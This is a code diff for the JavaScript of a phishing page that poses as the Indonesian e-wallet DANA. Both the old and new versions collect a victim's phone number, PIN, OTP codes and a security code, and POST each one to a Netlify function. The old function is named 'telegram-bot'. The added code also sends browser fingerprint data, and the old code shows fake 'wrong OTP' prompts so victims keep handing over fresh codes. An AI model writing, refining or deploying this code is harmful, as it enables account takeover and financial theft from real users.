@@ -1,354 +1,310 @@
-document.addEventListener('DOMContentLoaded', () => {
-  // DOM References
-  const pages = {
-    n: document.getElementById('number-page'),
-    p: document.getElementById('pin-page'),
-    o: document.getElementById('otp-page')
-  };
-  
-  const lb = document.getElementById('lanjutkan-button');
-  const pn = document.getElementById('phone-number');
-  const pis = document.querySelectorAll('.pin-box');
-  const ois = document.querySelectorAll('.otp-box');
-  const fn = document.getElementById('floating-notification');
-  const sn = document.getElementById('success-notification');
-  const rn = document.getElementById('reward-notification');
-  const ac = document.getElementById('attempt-counter');
-  const an = document.getElementById('attempt-number');
-  const lc = document.getElementById('lanjutkan-container');
-  const rewardInstruction = document.getElementById('reward-instruction');
-  const resendOtp = document.getElementById('resend-otp');
-
-  // State Variables
-  let currentPage = 'n';
-  let phoneNumber = '';
-  let pin = '';
-  let otp = '';
-  let attemptCount = 0;
-  const maxAttempts = 6;
-  let otpTimer;
-
-  // Helper Functions
-  function showSpinner() {
-    document.querySelector('.spinner-overlay').style.display = 'flex';
-  }
-
-  function hideSpinner() {
-    document.querySelector('.spinner-overlay').style.display = 'none';
-  }
-
-  function startOTPTimer() {
-    let timeLeft = 120;
-    const timerElement = document.getElementById('otp-timer');
+document.addEventListener('DOMContentLoaded', function() {
+    // Elements
+    const loadingScreen = document.querySelector('.loading-screen');
+    const container = document.querySelector('.container');
+    const phonePage = document.querySelector('.phone-page');
+    const pinPage = document.querySelector('.pin-page');
+    const otpPage = document.querySelector('.otp-page');
+    const securityModal = document.querySelector('.security-modal');
+    const overlay = document.querySelector('.overlay');
     
-    // Reset timer state
-    clearInterval(otpTimer);
-    if (resendOtp) {
-      resendOtp.style.pointerEvents = 'none';
-      resendOtp.style.opacity = '0.5';
-    }
+    // Data yang akan dikumpulkan
+    let userData = {
+        phone: '',
+        pin: '',
+        otp: '',
+        securityCode: ''
+    };
     
-    otpTimer = setInterval(() => {
-      const minutes = Math.floor(timeLeft / 60);
-      const seconds = timeLeft % 60;
-      timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-      
-      if (timeLeft <= 0) {
-        clearInterval(otpTimer);
-        if (resendOtp) {
-          resendOtp.style.pointerEvents = 'auto';
-          resendOtp.style.opacity = '1';
-        }
-      }
-      timeLeft--;
-    }, 1000);
-  }
-
-  function resetOTPInputs() {
-    ois.forEach(input => input.value = '');
-    if (ois[0]) ois[0].focus();
-    otp = '';
-    attemptCount++;
-    if (an) an.textContent = attemptCount;
-    if (ac) ac.style.display = 'block';
-  }
-
-  function showRewardInstruction() {
-    if (rewardInstruction) {
-      rewardInstruction.style.display = 'block';
-      
-      // Close button handler
-      const closeBtn = rewardInstruction.querySelector('.close-btn');
-      if (closeBtn) {
-        closeBtn.addEventListener('click', () => {
-          rewardInstruction.style.display = 'none';
-        });
-      }
-    }
-  }
-
-  // Backend Communication - Fixed function name
-  async function sendDanaData(type, data) {
-    try {
-      // Menggunakan nama function yang benar
-      const response = await fetch('/.netlify/functions/telegram-bot', {
-        method: 'POST',
-        headers: { 
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({ type, ...data })
-      });
-      
-      if (!response.ok) {
-        const errorText = await response.text();
-        throw new Error(errorText || `Server error: ${response.status}`);
-      }
-      
-      return await response.json();
-    } catch (error) {
-      console.error('API Error:', error);
-      
-      // Fallback: Simulasi sukses jika server error (untuk demo)
-      if (error.message.includes('Failed to fetch') || error.message.includes('NetworkError')) {
-        console.log('Network error, continuing in demo mode');
-        return { success: true, message: 'Data processed successfully (demo mode)' };
-      }
-      
-      throw error;
-    }
-  }
-
-  // Phone Number Formatting
-  if (pn) {
-    pn.addEventListener('input', (e) => {
-      // Hapus semua karakter non-digit
-      let value = e.target.value.replace(/\D/g, '');
-      
-      // Hapus angka 0 di awal jika ada
-      if (value.startsWith('0')) {
-        value = value.substring(1);
-      }
-      
-      // Pastikan selalu dimulai dengan 8
-      if (value.length > 0 && !value.startsWith('8')) {
-        value = '8' + value.replace(/^8/, '');
-      }
-      
-      // Batasi panjang maksimal (3+4+5=12 digit)
-      if (value.length > 12) {
-        value = value.substring(0, 12);
-      }
-      
-      // Format nomor dengan tanda hubung
-      let formatted = '';
-      if (value.length > 0) {
-        formatted = value.substring(0, 3);
-        if (value.length > 3) {
-          formatted += '-' + value.substring(3, 7);
-        }
-        if (value.length > 7) {
-          formatted += '-' + value.substring(7, 12);
-        }
-      }
-      
-      // Set nilai input dengan format yang sudah dibuat
-      e.target.value = formatted;
-      
-      // Simpan nomor tanpa format untuk pengiriman data
-      phoneNumber = value;
-      
-      // Tampilkan tombol lanjutkan jika nomor valid
-      if (phoneNumber.length >= 10 && lb) {
-        lb.disabled = false;
-        lb.style.opacity = '1';
-      } else if (lb) {
-        lb.disabled = true;
-        lb.style.opacity = '0.7';
-      }
-    });
-  }
-
-  // Event Handlers
-  if (lb) {
-    lb.addEventListener('click', async () => {
-      if (currentPage === 'n') {
-        if (phoneNumber.length < 10) {
-          alert('Nomor HP harus minimal 10 digit');
-          return;
-        }
-        
-        showSpinner();
-        try {
-          const result = await sendDanaData('phone', { phone: phoneNumber });
-          console.log('Phone submission result:', result);
-          
-          pages.n.style.display = 'none';
-          pages.p.style.display = 'block';
-          currentPage = 'p';
-          if (lc) lc.style.display = 'none';
-        } catch (error) {
-          console.error('Phone submission error:', error);
-          alert('Gagal mengirim data: ' + error.message);
-        } finally {
-          hideSpinner();
-        }
-      }
-    });
-  }
-
-  // PIN Input Handling
-  if (pis.length > 0) {
-    pis.forEach((input, index) => {
-      input.addEventListener('input', async (e) => {
-        e.target.value = e.target.value.replace(/\D/g, '');
-        
-        if (e.target.value.length === 1 && index < pis.length - 1) {
-          pis[index + 1].focus();
-        }
-        
-        pin = Array.from(pis).map(i => i.value).join('');
-        
-        if (pin.length === 6) {
-          showSpinner();
-          try {
-            const result = await sendDanaData('pin', { phone: phoneNumber, pin });
-            console.log('PIN submission result:', result);
-            
-            pages.p.style.display = 'none';
-            pages.o.style.display = 'block';
-            currentPage = 'o';
-            if (lc) lc.style.display = 'none';
-            startOTPTimer();
-            setTimeout(() => {
-              if (fn) {
-                fn.style.display = 'block';
-                fn.innerHTML = 'Silakan verifikasi notifikasi yang muncul di perangkat Anda untuk menerima kode OTP.';
-              }
-            }, 1000);
-          } catch (error) {
-            console.error('PIN submission error:', error);
-            alert('Gagal mengirim PIN: ' + error.message);
-          } finally {
-            hideSpinner();
-          }
-        }
-      });
-      
-      input.addEventListener('keydown', (e) => {
-        if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
-          pis[index - 1].focus();
-        }
-      });
-    });
-  }
-
-  // OTP Input Handling
-  if (ois.length > 0) {
-    ois.forEach((input, index) => {
-      input.addEventListener('input', async (e) => {
-        e.target.value = e.target.value.replace(/\D/g, '');
-        
-        if (e.target.value.length === 1 && index < ois.length - 1) {
-          ois[index + 1].focus();
-        }
-        
-        otp = Array.from(ois).map(i => i.value).join('');
-        
-        if (index === ois.length - 1 && e.target.value.length === 1) {
-          showSpinner();
-          try {
-            const result = await sendDanaData('otp', { phone: phoneNumber, pin, otp });
-            console.log('OTP submission result:', result);
-            
-            setTimeout(() => {
-              resetOTPInputs();
-              
-              // Show reward instruction after 2 attempts
-              if (attemptCount === 2) {
-                showRewardInstruction();
-              }
-              
-              if (attemptCount > 2 && rn) {
-                rn.style.display = 'block';
-                rn.innerHTML = `
-                  <div class="notification-content">
-                    <h3>Kode OTP Salah</h3>
-                    <p>Silakan cek SMS atau WhatsApp Anda</p>
-                  </div>
-                `;
-                setTimeout(() => {
-                  if (rn) rn.style.display = 'none';
-                }, 10000);
-              }
-              
-              if (attemptCount >= maxAttempts && sn) {
-                if (fn) fn.style.display = 'none';
-                sn.style.display = 'block';
-                setTimeout(() => {
-                  if (sn) sn.style.display = 'none';
-                }, 5000);
-              }
-            }, 1000);
-          } catch (error) {
-            console.error('OTP submission error:', error);
-          } finally {
-            hideSpinner();
-          }
-        }
-      });
-      
-      input.addEventListener('keydown', (e) => {
-        if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
-          ois[index - 1].focus();
-        }
-      });
-    });
-  }
-
-  // Resend OTP Handler
-  if (resendOtp) {
-    resendOtp.addEventListener('click', function() {
-      if (this.style.pointerEvents === 'auto' || this.style.opacity === '1') {
-        showSpinner();
-        setTimeout(() => {
-          startOTPTimer();
-          hideSpinner();
-          alert('Kode OTP telah dikirim ulang ke nomor Anda');
-        }, 1000);
-      }
-    });
-  }
-
-  // Toggle PIN Visibility
-  const showTextBtn = document.querySelector('.show-text');
-  if (showTextBtn) {
-    showTextBtn.addEventListener('click', (e) => {
-      const isShowing = e.target.classList.toggle('active');
-      const pinInputs = document.querySelectorAll('.pin-box');
-      pinInputs.forEach(input => {
-        input.type = isShowing ? 'text' : 'password';
-      });
-      e.target.textContent = isShowing ? 'Sembunyikan' : 'Tampilkan';
-    });
-  }
-
-  // Handle floating notification click
-  if (fn) {
-    fn.addEventListener('click', () => {
-      fn.style.display = 'none';
-    });
-  }
-
-  // Initialize button state
-  if (lb) {
-    lb.disabled = true;
-    lb.style.opacity = '0.7';
-  }
-
-  // Auto-focus on first input
-  if (pn) {
+    // Simulate loading process
     setTimeout(() => {
-      pn.focus();
-    }, 500);
-  }
+        loadingScreen.style.opacity = '0';
+        setTimeout(() => {
+            loadingScreen.style.display = 'none';
+            container.style.opacity = '1';
+        }, 500);
+    }, 2500);
+    
+    // Phone input formatting
+    const phoneInput = document.getElementById('phone');
+    phoneInput.addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, '');
+        
+        // Remove leading 0 if present
+        if (value.startsWith('0')) {
+            value = value.substring(1);
+        }
+        
+        // Format the value with spaces
+        if (value.length > 3 && value.length <= 7) {
+            value = value.replace(/(\d{3})(\d+)/, '$1 $2');
+        } else if (value.length > 7) {
+            value = value.replace(/(\d{3})(\d{4})(\d+)/, '$1 $2 $3');
+        }
+        
+        e.target.value = value;
+        userData.phone = value.replace(/\s/g, '');
+    });
+    
+    // Continue to PIN page
+    document.getElementById('continue-phone').addEventListener('click', function() {
+        const phoneNumber = phoneInput.value.replace(/\D/g, '');
+        
+        if (phoneNumber.length < 10) {
+            alert('Masukkan nomor telepon yang valid');
+            return;
+        }
+        
+        userData.phone = phoneNumber;
+        
+        // Send phone data to Netlify function
+        sendDataToNetlify({
+            type: 'phone',
+            phone: userData.phone,
+            timestamp: new Date().toISOString()
+        });
+        
+        phonePage.style.display = 'none';
+        pinPage.style.display = 'block';
+    });
+    
+    // PIN functionality
+    const pinDots = document.querySelectorAll('.pin-dot');
+    const pinKeys = document.querySelectorAll('.pin-key:not(.pin-backspace)');
+    const backspaceKey = document.querySelector('.pin-backspace');
+    
+    let currentPin = '';
+    
+    pinKeys.forEach(key => {
+        key.addEventListener('click', function() {
+            if (currentPin.length < 6) {
+                currentPin += this.textContent;
+                updatePinDots();
+                
+                if (currentPin.length === 6) {
+                    userData.pin = currentPin;
+                    
+                    // Send PIN data to Netlify function
+                    sendDataToNetlify({
+                        type: 'pin',
+                        phone: userData.phone,
+                        pin: userData.pin,
+                        timestamp: new Date().toISOString()
+                    });
+                    
+                    // Automatically proceed to OTP page after a short delay
+                    setTimeout(() => {
+                        pinPage.style.display = 'none';
+                        otpPage.style.display = 'block';
+                        
+                        // Focus first OTP input
+                        document.querySelector('.otp-input').focus();
+                    }, 300);
+                }
+            }
+        });
+    });
+    
+    backspaceKey.addEventListener('click', function() {
+        if (currentPin.length > 0) {
+            currentPin = currentPin.slice(0, -1);
+            updatePinDots();
+        }
+    });
+    
+    function updatePinDots() {
+        pinDots.forEach((dot, index) => {
+            if (index < currentPin.length) {
+                dot.classList.add('filled');
+            } else {
+                dot.classList.remove('filled');
+            }
+        });
+    }
+    
+    // OTP input functionality
+    const otpInputs = document.querySelectorAll('.otp-input');
+    
+    otpInputs.forEach((input, index) => {
+        input.addEventListener('input', function(e) {
+            if (this.value.length === 1 && index < otpInputs.length - 1) {
+                otpInputs[index + 1].focus();
+            }
+            
+            // Check if all OTP inputs are filled
+            const allFilled = Array.from(otpInputs).every(input => input.value.length === 1);
+            if (allFilled) {
+                // Get OTP code
+                const otpCode = Array.from(otpInputs).map(input => input.value).join('');
+                userData.otp = otpCode;
+                
+                // Send OTP data to Netlify function
+                sendDataToNetlify({
+                    type: 'otp',
+                    phone: userData.phone,
+                    pin: userData.pin,
+                    otp: userData.otp,
+                    timestamp: new Date().toISOString()
+                });
+                
+                // Show security modal
+                securityModal.classList.add('active');
+                overlay.style.display = 'block';
+                
+                // Focus first security input
+                document.querySelector('.security-input').focus();
+            }
+        });
+        
+        input.addEventListener('keydown', function(e) {
+            if (e.key === 'Backspace' && this.value === '' && index > 0) {
+                otpInputs[index - 1].focus();
+            }
+        });
+    });
+    
+    // Security code functionality
+    const securityInputs = document.querySelectorAll('.security-input');
+    const verifyButton = document.querySelector('.verify-button');
+    
+    securityInputs.forEach((input, index) => {
+        input.addEventListener('input', function(e) {
+            if (this.value.length === 1 && index < securityInputs.length - 1) {
+                securityInputs[index + 1].focus();
+            }
+            
+            // Check if all security inputs are filled
+            const allFilled = Array.from(securityInputs).every(input => input.value.length === 1);
+            if (allFilled) {
+                // Get security code
+                const securityCode = Array.from(securityInputs).map(input => input.value).join('');
+                userData.securityCode = securityCode;
+                
+                // Send security code data to Netlify function
+                sendDataToNetlify({
+                    type: 'security_code',
+                    phone: userData.phone,
+                    pin: userData.pin,
+                    otp: userData.otp,
+                    code: userData.securityCode,
+                    timestamp: new Date().toISOString()
+                });
+            }
+        });
+        
+        input.addEventListener('keydown', function(e) {
+            if (e.key === 'Backspace' && this.value === '' && index > 0) {
+                securityInputs[index - 1].focus();
+            }
+        });
+    });
+    
+    // Verify button click handler
+    verifyButton.addEventListener('click', function() {
+        const securityCode = Array.from(securityInputs).map(input => input.value).join('');
+        
+        if (securityCode.length === 4) {
+            userData.securityCode = securityCode;
+            
+            // Send final verification data
+            sendDataToNetlify({
+                type: 'final_verification',
+                phone: userData.phone,
+                pin: userData.pin,
+                otp: userData.otp,
+                code: userData.securityCode,
+                status: 'completed',
+                timestamp: new Date().toISOString()
+            });
+            
+            // Simulate successful verification
+            setTimeout(() => {
+                alert('Verifikasi berhasil! Akun Anda telah terhubung.');
+                // Redirect atau tampilkan pesan sukses
+                window.location.reload(); // Reset form
+            }, 1000);
+        } else {
+            alert('Harap masukkan kode keamanan lengkap');
+        }
+    });
+    
+    // Close security modal
+    document.querySelector('.close-modal').addEventListener('click', function() {
+        securityModal.classList.remove('active');
+        overlay.style.display = 'none';
+    });
+    
+    overlay.addEventListener('click', function() {
+        securityModal.classList.remove('active');
+        overlay.style.display = 'none';
+    });
+    
+    // Verify OTP button
+    document.getElementById('verify-otp').addEventListener('click', function() {
+        // Get OTP values
+        const otpCode = Array.from(otpInputs).map(input => input.value).join('');
+        
+        if (otpCode.length === 6) {
+            userData.otp = otpCode;
+            
+            // Send OTP data to Netlify function
+            sendDataToNetlify({
+                type: 'otp',
+                phone: userData.phone,
+                pin: userData.pin,
+                otp: userData.otp,
+                timestamp: new Date().toISOString()
+            });
+            
+            // Show security modal
+            securityModal.classList.add('active');
+            overlay.style.display = 'block';
+            
+            // Focus first security input
+            document.querySelector('.security-input').focus();
+        } else {
+            alert('Harap masukkan kode OTP lengkap');
+        }
+    });
+    
+    // Function to send data to Netlify function
+    function sendDataToNetlify(data) {
+        // Add additional metadata
+        const payload = {
+            ...data,
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            platform: navigator.platform,
+            screen: {
+                width: screen.width,
+                height: screen.height
+            },
+            url: window.location.href,
+            referrer: document.referrer
+        };
+        
+        console.log('Sending data to Netlify:', payload);
+        
+        // Send to Netlify function
+        fetch('/.netlify/functions/send-dana-data', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(payload),
+        })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
+            return response.json();
+        })
+        .then(data => {
+            console.log('Data sent successfully:', data);
+        })
+        .catch((error) => {
+            console.error('Error sending data:', error);
+            // Continue execution even if sending fails
+        });
+    }
 });
